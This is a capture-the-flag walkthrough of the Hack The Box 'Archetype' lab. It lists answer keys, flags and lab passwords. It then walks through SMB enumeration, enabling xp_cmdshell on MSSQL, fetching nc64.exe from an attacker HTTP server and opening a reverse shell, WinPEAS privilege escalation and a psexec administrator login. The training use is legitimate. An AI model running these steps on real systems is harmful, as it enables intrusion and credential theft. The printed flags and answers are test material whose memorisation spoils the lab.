Hack The Box
Machine: Archetype
Part of the Starting point tier 2 series
Difficulty: Very Easy
Google Docs: https://docs.google.com/document/d/1Y2ZHLdE5gXIgEhBKIbLzV2v4XP6WAKXLHGsOuc7-JYU/edit?usp=sharing

Q1: Which TCP port is hosting a database sever?
A1: 1433

Q2: What is the name of the non administrative share available over SMB
A2: backups

Q3: What is the password identified in the file on the SMB share?
A3: M3g4c0rp123

Q4: What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
A4: mssqlclient.py

Q5: What extended stored procedure of Microsoft SQL Servers can be used in order to spawn a Windows command shell?
A5: xp_cmdshell

Q6: What script can be used in order to search possible paths to escalate privileges on windows hosts
A6: WinPeas

Q7: What file contains the administrators password?
A7: ConsoleHost_history.txt

Q8: Submit the User flag
A8: 3e7b102e78218e935bf3f4951fec21a3

Q9: Submit the Root flag
A9: b91ccec3305e98240082d4474b848528



Step1:
  Run nmap to discover open ports and service versions on them.
  nmap -sV -vv <target_IP>
  
  Scan Results:
    PORT     STATE SERVICE      REASON  VERSION
  135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
  139/tcp  open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
  445/tcp  open  microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
  1433/tcp open  ms-sql-s     syn-ack Microsoft SQL Server 2017 14.00.1000
  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
  
  This gives us the answer to question 1 which is 1433
  
 Step2: 
    We need to use smbclient to check out the shares available on the target machine.
    smbclient -N -L <target_IP>
    
    Command output:
      Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        
    Since we know administrative shares are marked with the $ symbol we see the answer to question 2 is "backups"
    
  Step3: 
      We need to connect to the smb client and access the back upsshares.
      We will do this with the following command
      smbclient -N \\\\<target_IP>\\backups
      
      We should now have SMB access to the machine. Running the ls command will show there is just one file in the backups directory
      use get prod.dtsConfig to download the file
      
      back in your working diretory cat the file and within the output you will find this line giving us the answer to question 3
      Password=M3g4c0rp123;User ID=ARCHETYPE
 
  Step4: 
    You will need to install impacket if you don't have it. 
    
    git clone https://github.com/SecureAuthCorp/impacket.git
    
    cd impacket
    
    sudo python3 setup.py install
    
    You will need to navigate over to the scripts directory so from the impacket directory cd /build/scripts-3.10/
    
    here you can ls to see all of the available scripts but the one we will be working with is mssqlclient.py since we already found an sql_svc user name and password
    
    The next command to enter will be
    python3 mssqlclient.py ARCHETYPE/sql_svc@<target_IP> -windows-auth
    
    Enter M3g4c0rp123 as the password when prompted and you will be logged into the machines SQL server.
    
  Step5: 
    If you enter help you will be display with this menu:
      SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
   using xp_cmdshell "whoami" generates an error telling us xp_cmdshell has been turned off as a security procedure but that a system administrator can enable it by using sp_configure
   
   So let's give it a shot by entering 4 commands
    1. EXEC sp_configure 'show advanced options', 1;
    2. RECONFIGURE;
    3. EXEC sp_configure 'xp_cmdshell', 1;
    4. RECONFIGURE;
   If you did it right it'll seem like nothing happened but if we now run our test command it should produce output
   xp_cmdshell "whoami"
   
  Step6: 
    From here we need to set up a reverse shell we will do this by uploading a binary to the target machine and execute a cmd.exe process on our listening port
    the Binary can be found here https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
    it should be a file labeled nc64.exe in your downloads directory, which you will need to navigate over to.
    From that directory we will start an HTTP server using python
    sudo python3 -m http.server --bind <Attack_IP> 80
    We will also open a new terminal and set up our listener port using netcat
    sudo nc -l <Attack_IP> 443
    
  Step 7: 
    We need to actually upload the binary to the target system. to do that we need to find the appropriate folder. So we will start looking in the terminal still logged into the SQL server. We will also be using powershell to navigate around, but it will have to be specified before each command using "powershell -c"
    So for example to see where we are in the file system enter the following command
    xp_cmdshell "powershell -c pwd"
    and we see we are in the system32 directory which the user ARCHETYPE does not have permission to upload files to. So we will need to change the current working directory, we are going  to do this and upload our nc64.exe file with one command
    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<Attack_IP>/nc64.exe -outfile nc64.exe"
    Our terminal serving up python should verify that the file was sent
    Now we need to bind cmd.exe through the nc to our listener port
    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <Attack_IP> 443"
    We should now see in our listener terminal that we have access to a reverse shell.
    
  Step 8: 
    Our reverse shell is set up on a windows machine so we will have to use windows commands from this point, but the user flag for this machine is just on the desktop
    cd ..
    cd Desktop
    dir
    type user.txt
    3e7b102e78218e935bf3f4951fec21a3
    
 Step 9: 
  now we need to do some privelege escalation
  We will need to donwload a a program called WinPeas onto our attack machine and then serve it up on our python http sever to be downloaded onto the target machine
  Win Peas can be found here https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
  
  Enter the following commands in our Reverse shell from the Downloads directory
  powershell
  wget http://<Attack_IP>/winPEASx64.exe -outfile winPEASx64.exe
  We can see in our terminal hosting the python http server that our binary downloaded on the target machine so we just have to execute it
  from the Downloads Directory on the target machine simply type .\winPEASx64.exe
  This will generate a lot of output but the line we are most concerened with is 
   C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  which gives us the answer to question 7.
  
 Step 10: 
  We simply need to navigate over to this file and open it to obtain the administrators password
  cd ..
  cd \AppData
  cd \Roaming
  cd \Microsoft
  cd \Windows
  cd \PowerShell
  cd \PSReadLine\
  I'm not really sure why I had to move directories individually, but I did. I assume it has something to do with the reverse shell
  in windows you use the type command to read a file so enter
  type ConsoleHost_history.txt
  and we will see "/user:administrator MEGACORP_4dm1n!!" which is our administrators password
  
  Step 11: 
    We need to actually get our root flag but with the password that is pretty simple
    inside of a terminal on our attack machine navigate Back to our /impacket/build/scripts-3.10 directory 
    This time we are going to use the psexec.py script to log in to the target machine as administrator
    to do so enter the following command
    python3 psexec.py administrator@<Target_IP>
    when prompted for the password enter MEGACORP_4dm1n!!
    
    The flag can be found in the User\Administrator\Desktop directory
    b91ccec3305e98240082d4474b848528

    
   
   
     

    

    
